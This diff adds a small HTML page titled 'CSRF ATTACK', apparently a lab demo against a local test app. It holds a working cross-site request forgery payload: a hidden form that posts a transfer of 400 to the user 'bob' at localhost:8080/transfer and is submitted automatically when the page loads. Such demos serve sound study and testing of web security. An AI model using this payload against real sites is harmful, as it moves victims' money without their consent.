@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF ATTACK</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CSRF ATTACK</h1>
+    </div>
+    <form id="transferForm" action="http://localhost:8080/transfer" method="POST">
+        <input type="hidden" name="destinationUsername" value="bob">
+        <input type="hidden" name="amount" value="400">
+    </form>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Auto-submit the form when the page loads
+            document.getElementById("transferForm").submit();
+        });
+    </script>
+</body>
+</html>
